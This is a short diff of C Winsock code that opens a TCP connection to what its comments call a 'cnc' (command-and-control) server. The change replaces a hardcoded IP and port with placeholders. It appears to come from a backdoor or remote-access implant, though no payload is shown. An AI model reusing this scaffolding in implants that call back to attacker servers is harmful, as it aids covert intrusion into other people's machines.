@@ -16,9 +16,9 @@ int main()
     SOCKADDR_IN addr; // declare var for address
     WSAStartup(MAKEWORD(2, 0), &WSAData); // o
     server = socket(AF_INET, SOCK_STREAM, 0); //define socket
-    addr.sin_addr.s_addr = inet_addr("192.168.1.32"); // set cnc IP
+    addr.sin_addr.s_addr = inet_addr("CnC_IP"); // set cnc IP (uses hardcoded value like 1.1.1.1)
     addr.sin_family = AF_INET; // ipv4
-    addr.sin_port = htons(5555); // set cnc port
+    addr.sin_port = htons(CNC_PORT); // set cnc port (Also hardcoded value, 1-65535)
     connect(server, (SOCKADDR *)&addr, sizeof(addr)); // connect to cnc server
     
     
